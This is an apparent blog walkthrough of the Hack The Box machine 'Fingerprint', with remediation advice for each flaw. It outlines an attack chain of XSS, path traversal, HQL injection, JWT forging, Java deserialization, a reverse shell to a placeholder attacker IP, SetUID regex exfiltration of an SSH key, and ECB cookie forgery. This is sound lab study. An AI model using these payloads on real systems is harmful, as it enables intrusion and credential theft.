---
title: "Fingerprint HTB - Insane Linux Box Walkthrough"
date: 2025-09-22T08:00:00Z
tags: ["insane-linux", "web", "xss", "lfi", "hql-injection", "deserialization", "jwt-forging", "setuid-binary", "ecb-crypto", "privilege-escalation"]
difficulty: ["insane"]
categories: ["HTB", "Linux"]
draft: false
description: "Complete walkthrough of Fingerprint HTB machine featuring XSS, LFI, HQL injection, Java deserialization, JWT forging, SetUID binary exploitation, and ECB crypto attacks"
---

# Fingerprint HTB - Insane Linux Box Walkthrough

{{< youtube YBabDbyk3eo >}}

Fingerprint is an Insane difficulty Linux machine from Hack The Box that demonstrates a complex chain of web application vulnerabilities and cryptographic attacks. This machine requires expertise in multiple areas including XSS, LFI, HQL injection, Java deserialization, JWT manipulation, binary exploitation, and ECB mode crypto attacks, culminating in a sophisticated privilege escalation chain.

## Key Exploitation Steps and Techniques (Chronological Order)

### Phase 1: Initial Reconnaissance and Web Discovery

#### 1. Initial Reconnaissance with Nmap
- Perform network scanning using `nmap -sC -sV -oA fingerprint <IP>`
- Identify open ports: SSH (22), HTTP (80, running Werkzeug on Python 2), and HTTP (8080, running Sun GlassFish 5.0.1, Java-based)
- Note outdated software versions (Python 2, GlassFish ~2017-2018)
- **Technique**: Network scanning and service enumeration with Nmap to identify attack surface

#### 2. Web Enumeration
- Manual browsing and directory enumeration using `feroxbuster -u <URL> -B` and `wfuzz` to discover backups and potential vulnerabilities
- Port 80 hosts a login panel ("My Log") with a 2019 copyright, indicating Flask (Python 2)
- Port 8080 has a login form with a 2018 copyright
- Discover an Execute-After-Redirect (EAR) vulnerability on `/admin` (302 redirect with unusual response size, revealing `auth.log`)
- **Technique**: Directory enumeration and manual testing to identify web application vulnerabilities

### Phase 2: Web Application Exploitation

#### 3. Cross-Site Scripting (XSS) Testing
- Test login form on port 8080 for XSS by injecting `<b>ipsec</b>` and `<img src=http://<attacker-ip>/image>`
- Confirm XSS vulnerability as user input was reflected unfiltered, and an external request was triggered to the attacker's server
- Identify potential for cookie theft through XSS
- **Technique**: XSS payload testing and external request validation for client-side vulnerability confirmation

#### 4. Local File Inclusion (LFI) Exploitation
- Test directory traversal in the log viewing functionality (e.g., `../../etc/passwd`)
- Successfully access `/etc/passwd`, `/proc/self/cmdline` (revealing Flask on port 80), and Python source files (`app.py`, `auth.py`, `util.py`) via LFI
- Extract Flask application secret key for JWT forging from source code
- **Technique**: Directory traversal and LFI to access sensitive files and source code

#### 5. HQL Injection
- Test login form on port 8080 for HQL injection (similar to SQL injection but for Hibernate)
- Use payloads like `admin' OR '1'='1` and `substring(username,1,1)='m'`
- Confirm HQL injection by triggering Hibernate errors and extracting data (e.g., usernames `admin` and `michael`)
- Retrieve a JWT token containing a Java serialized object (base64-encoded)
- **Technique**: HQL injection for database enumeration and JWT token extraction

### Phase 3: Advanced Exploitation and User Access

#### 6. JWT Forging and Deserialization Vulnerability
- Use the secret key from LFI to forge a JWT with a manipulated payload
- Download Java source files (`User.java`, `Profile.java`, `UserProfileStorage.java`) from `/backups`
- Identify a command injection vulnerability in `UserProfileStorage.java` where an admin profile triggers a shell command with the username
- Create a Java project in Eclipse to generate a serialized object (`ipsec.ser`) with `adminProfile=true`
- Upload `ipsec.ser` to `/data/uploads` via the application's upload functionality
- Forge a JWT with a username containing a directory traversal payload (`../../data/uploads/ipsec.ser`) to load the malicious serialized object
- Achieve command execution by triggering a ping to the attacker's machine, later upgrade to a reverse shell (`/dev/tcp/<attacker-ip>/9000`)
- **Technique**: Java deserialization exploitation combined with JWT forging for remote code execution

### Phase 4: Privilege Escalation to User John

#### 7. SetUID Binary Exploitation
- Identify a SetUID binary (`/usr/bin/cmatch`) owned by user `john` using `find / -perm -4000`
- Analyze `cmatch` functionality: counts matches of a pattern in a file (e.g., `cmatch /etc/passwd root` returned 3 matches)
- Confirm regex support, allowing boolean-based file content exfiltration
- Write a Python script to brute-force the contents of `/home/john/.ssh/id_rsa` one character at a time using regex patterns, leveraging `cmatch`'s SetUID privileges
- **Technique**: SetUID binary abuse for file content extraction via boolean-based attacks

#### 8. SSH Key Cracking
- Use `john` to crack the passphrase of the SSH key with a wordlist and passwords from the system (e.g., Hibernate database password `q9...`)
- Successfully crack the passphrase, allowing SSH login as user `john`
- **Technique**: Offline password cracking using dictionary attacks and credential reuse

### Phase 5: Further Enumeration and Crypto Attack

#### 9. Further Enumeration as John
- Search for files owned by `john` using `find / -user john`
- Identify a zip file (`/var/backups/flask_app_secure.back`)
- Copy and unzip the file, revealing a Flask application (`app.py`, `auth.py`) with custom crypto in ECB mode
- **Technique**: File system enumeration and backup analysis

#### 10. ECB Mode Crypto Exploitation
- Analyze `app.py` and identify ECB mode encryption (block size 16 bytes) for cookies in the format `username,secret,true/false`
- Exploit ECB's property where identical plaintext blocks produce identical ciphertext blocks
- Use XSS to steal a cookie from the Flask app (port 8088, discovered via `ss -lntp` and `flaskbeta.service`)
- Create an SSH tunnel (`ssh -L 8088:localhost:8088`) to access the app locally
- Write a Python script to brute-force the secret one byte at a time by padding usernames (e.g., 15 A's + guess) and matching ciphertext blocks
- Craft a cookie with `admin,secret,true` to gain admin access
- **Technique**: ECB mode cryptographic attack using block cipher properties for cookie forgery

### Phase 6: Root Privilege Escalation

#### 11. Root LFI and Privilege Escalation
- Access `/admin` on port 8088 with forged admin cookie, revealing another LFI vulnerability
- Use the admin LFI on port 8088 to read `/root/.ssh/id_rsa`
- Extract the root SSH private key, use it to SSH as `root`, and achieve full system compromise
- **Technique**: LFI exploitation for SSH key extraction and root access

## Security Gaps and Remediation

This machine demonstrates multiple critical security vulnerabilities across different services:

### Execute-After-Redirect (EAR) Vulnerability in Flask Application (Port 80)
- **Gap**: The `/admin` endpoint returns a 302 redirect but includes sensitive content (e.g., `auth.log`) in the response body, which can be intercepted by modifying the HTTP response, bypassing the intended redirect
- **Fix**: Source code fix - Modify the `/admin` endpoint to avoid including sensitive content in the response body before redirecting. Use a direct redirect without rendering content and implement Content Security Policy (CSP) headers

### Cross-Site Scripting (XSS) in Login Form (Port 8080, GlassFish)
- **Gap**: The login form does not sanitize user input, allowing reflected XSS via payloads that enable attackers to steal cookies or browser fingerprints
- **Fix**: Source code fix - Sanitize all user inputs using libraries like OWASP Java Encoder to escape HTML and JavaScript. Configuration fix - Enable strict Content Security Policy (CSP) to restrict script sources

### Local File Inclusion (LFI) in Flask Application (Port 80)
- **Gap**: The log viewing functionality allows directory traversal, enabling attackers to read sensitive files like `/etc/passwd` and Python source code containing secret keys
- **Fix**: Source code fix - Implement strict path validation with whitelists of allowed files and restrict access to specific directories. Configuration fix - Restrict file system permissions and use URL filtering rules to block suspicious characters

### HQL Injection in GlassFish Application (Port 8080)
- **Gap**: The login form is vulnerable to HQL injection due to unsanitized user input in Hibernate queries, allowing database information extraction and authentication bypass
- **Fix**: Source code fix - Use parameterized queries (Prepared Statements) in Hibernate to prevent injection. Configuration fix - Configure Hibernate with strict query validation and limit database permissions to application user

### Java Deserialization Vulnerability in GlassFish Application (Port 8080)
- **Gap**: The application processes JWT tokens containing base64-encoded Java serialized objects without validation, with `UserProfileStorage.java` executing shell commands if `adminProfile=true`
- **Fix**: Source code fix - Avoid deserialization of untrusted input, use strict allowlists of expected classes, remove command execution logic, and sanitize username fields. Configuration fix - Enable deserialization filters and run GlassFish with minimal privileges

### Insecure JWT Secret Key Exposure via LFI
- **Gap**: The Flask application's LFI vulnerability exposed the secret key used to sign JWTs, allowing attackers to forge valid JWT tokens
- **Fix**: Source code fix - Store sensitive keys in environment variables or secure configuration files outside the web root with sufficient entropy. Configuration fix - Use secrets management solutions and rotate JWT secret keys regularly

### SetUID Binary Vulnerability (`cmatch`)
- **Gap**: The SetUID binary allows regex-based file content matching, enabling boolean-based exfiltration of sensitive files when run by lower-privileged users
- **Fix**: Source code fix - Restrict `cmatch` to only process specific files, remove regex support if not needed, or sanitize regex patterns. Configuration fix - Remove SetUID bit if not required, restrict access to specific users, and use AppArmor or SELinux for confinement

### Weak SSH Key Passphrase
- **Gap**: SSH private keys were protected by weak passphrases, crackable using dictionary attacks and system-derived passwords
- **Fix**: Configuration fix - Enforce strong passphrase policies, disable password-based SSH authentication, and implement multi-factor authentication (MFA) for SSH access

### ECB Mode Encryption in Flask Beta Application (Port 8088)
- **Gap**: The application uses ECB mode encryption for cookies, allowing attackers to brute-force secrets by matching ciphertext blocks due to ECB's lack of diffusion
- **Fix**: Source code fix - Replace ECB with secure encryption modes like CBC or GCM, use HMAC for cookie integrity, and validate cookie format before processing. Configuration fix - Securely generate and store cryptographic keys with regular rotation

### LFI in Flask Beta Application (Port 8088, Admin Endpoint)
- **Gap**: The `/admin` endpoint allows LFI when accessed with an admin cookie, enabling attackers to read sensitive files like `/root/.ssh/id_rsa`
- **Fix**: Source code fix - Implement strict file path validation with whitelists and add proper authentication checks. Configuration fix - Restrict file system permissions and configure reverse proxy to block suspicious paths

### Outdated Software (Python 2, GlassFish 5.0.1)
- **Gap**: The system runs end-of-life Python 2 and outdated GlassFish, potentially vulnerable to known exploits
- **Fix**: Configuration fix - Upgrade to supported software versions (Python 3.10+, modern GlassFish or alternatives) and regularly apply security patches

### Unnecessary Exposure of Sensitive Files (WAR File, Source Code)
- **Gap**: The `/backups` directory exposes Java source code and WAR files without authentication, containing sensitive application logic and database credentials
- **Fix**: Configuration fix - Restrict access to backup directories, move sensitive files outside web root, and implement access logging. Source code fix - Use build processes to exclude source code from deployment

## Conclusion

Fingerprint is an excellent machine that demonstrates the complexity of modern web application security and cryptographic vulnerabilities. It requires expertise in:
- Advanced web application exploitation including XSS, LFI, and HQL injection
- Java deserialization vulnerabilities and custom payload development
- JWT manipulation and cryptographic attacks
- Binary exploitation and SetUID privilege abuse
- ECB mode cryptographic weaknesses and block cipher analysis
- Multi-stage privilege escalation and credential reuse attacks

The machine emphasizes the importance of secure coding practices, proper input validation, secure cryptographic implementations, and the principle of least privilege in complex application environments.

---

*This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.*